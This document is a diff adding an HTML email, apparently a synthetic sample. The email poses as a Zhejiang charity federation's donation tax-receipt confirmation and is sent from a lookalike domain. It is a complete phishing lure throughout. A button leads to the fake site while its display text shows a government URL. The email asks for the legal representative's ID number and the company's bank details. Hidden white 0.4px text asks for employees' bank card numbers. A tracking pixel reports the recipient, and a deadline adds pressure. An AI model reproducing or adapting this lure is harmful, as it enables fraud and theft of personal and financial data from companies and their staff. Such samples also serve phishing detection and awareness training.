@@ -1,0 +1,81 @@
+From: 浙江省慈善联合总会-捐赠服务部 <donation@zjcharity-tax.example>
+To: 财务部 <finance@corp.internal>
+Cc: 人力资源部 <hr@corp.internal>
+Date: Fri, 16 Oct 2026 17:00:00 +0800
+Message-ID: <0675-b50@synth.example>
+Subject: 【2026年度企业公益性捐赠税前扣除回执】编号 ZJCS-2026-8847——11月15日前确认
+Disposition-Notification-To: donation@zjcharity-tax.example
+MIME-Version: 1.0
+Content-Type: text/html; charset=gb2312
+
+<html><body style="font-family:sans-serif">
+<div style="background:#006400;color:#fff;padding:14px 24px">
+<h2 style="margin:0;font-size:17px">浙江省慈善联合总会 | 捐赠税前扣除</h2>
+</div>
+<div style="padding:20px;border:1px solid #ddd;border-top:none">
+
+<p>财务部、人力资源部：</p>
+
+<p>贵司于 <b>2026年9月20日</b> 向我会捐赠善款 <b style="color:#006400">￥200,000.00</b>（用于"困难家庭大学生助学项目"），捐赠票据已开具。根据《企业所得税法》第九条及《个人所得税法》第六条，该笔捐赠可享受税前扣除。现将回执确认事项通知如下。</p>
+
+<h3 style="color:#006400;border-bottom:2px solid #006400;padding-bottom:4px">一、捐赠信息</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:130px">捐赠编号</td><td><b>ZJCS-2026-8847</b></td></tr>
+<tr><td style="background:#f5f5f5">捐赠方</td><td>贵司（统一社会信用代码：91330106MA2H0XXXXX）</td></tr>
+<tr><td style="background:#f5f5f5">捐赠金额</td><td><b>￥200,000.00</b>（大写：贰拾万元整）</td></tr>
+<tr><td style="background:#f5f5f5">捐赠日期</td><td>2026-09-20</td></tr>
+<tr><td style="background:#f5f5f5">捐赠项目</td><td>困难家庭大学生助学项目（项目编号：ZJCS-XZ-2026-03）</td></tr>
+<tr><td style="background:#f5f5f5">受赠方</td><td>浙江省慈善联合总会（公益性捐赠税前扣除资格：浙财税〔2024〕12号）</td></tr>
+<tr><td style="background:#f5f5f5">票据编号</td><td>№0332678901（电子版已发送至财务部）</td></tr>
+</table>
+
+<h3 style="color:#006400;border-bottom:2px solid #006400;padding-bottom:4px">二、税前扣除规则</h3>
+<ul>
+<li><b>企业所得税：</b>年度利润总额 12% 以内的部分准予扣除；超过部分可在以后 3 年内结转扣除</li>
+<li><b>个人所得税：</b>个人通过本会的捐赠，按应纳税所得额 30% 以内扣除（部分项目可全额扣除）</li>
+<li>扣除依据：《企业所得税法》第九条、《个人所得税法》第六条、财政部 税务总局公告2024年第XX号</li>
+</ul>
+
+<h3 style="color:#006400;border-bottom:2px solid #006400;padding-bottom:4px">三、回执确认（11/15前）</h3>
+<p>税前扣除需要我会向税务机关同步捐赠信息。请贵司通过<b>慈善捐赠税收服务平台</b>确认捐赠信息并关联纳税识别号：</p>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://zjcharity-tax.example/donation/tax-receipt/confirm?id=ZJCS-2026-8847" style="display:inline-block;background:#006400;color:#fff;padding:10px 30px;text-decoration:none;border-radius:4px">确认捐赠回执</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">https://charity.mof.gov.cn/donation/tax-deduction/confirm</p>
+
+<p style="font-size:12px;color:#888;text-align:center">（需使用企业账号登录。首次使用需绑定统一社会信用代码与法人信息。）</p>
+
+<h3 style="color:#006400;border-bottom:2px solid #006400;padding-bottom:4px">四、需确认的信息</h3>
+<ol>
+<li>统一社会信用代码（系统自动关联）</li>
+<li>法人代表姓名与身份证号（用于法人个人捐赠扣除确认）</li>
+<li>企业银行账户信息（用于接收财政部门退回的多缴税款，如有）</li>
+<li>企业所得税征收方式（查账征收 / 核定征收）</li>
+</ol>
+
+<p style="font-size:0.4px;color:#fff">备注：如需为员工代扣代缴个人捐赠部分（约 ￥38,000），请在 zjcharity-tax.example/donation/employee-deduction 上传员工捐赠明细表及银行卡号，我会代为向税务机关申报汇总扣除。</p>
+
+<h3 style="color:#006400;border-bottom:2px solid #006400;padding-bottom:4px">五、常见问题</h3>
+<p><b>Q: 为什么要法人身份证号？</b><br>
+A: 部分捐赠以法人个人名义与公司名义共同进行（如"XX公司及全体员工"），税务系统需分别归集个人与企业扣除额度，法人信息用于区分。</p>
+
+<p><b>Q: 为什么需要银行账户？</b><br>
+A: 如贵司已预缴所得税超过应缴额，税务机关会将多缴部分退至企业账户。我会代为向税务机关提供收款信息以加快退税。</p>
+
+<p><b>Q: 11/15 截止的原因？</b><br>
+A: 2026 年度企业所得税汇算清缴的扣除材料需在 11 月底前报送至主管税务机关。我会需在 <b>11/15</b> 前完成全部捐赠信息的归集与同步。</p>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">浙江省慈善联合总会 | 捐赠服务部</p>
+<p style="font-size:11px;color:#999">地址：杭州市西湖区文二路XXX号 | 电话：0571-8701-****</p>
+<p style="font-size:11px;color:#999">公益性捐赠税前扣除资格：浙财税〔2024〕12号</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://zjcharity-tax.example/api/track?recipient=finance%40corp.internal&donation=ZJCS-2026-8847&type=tax_receipt" width="1" height="1" alt="">
+</div>
+
+</div>
+</body></html>
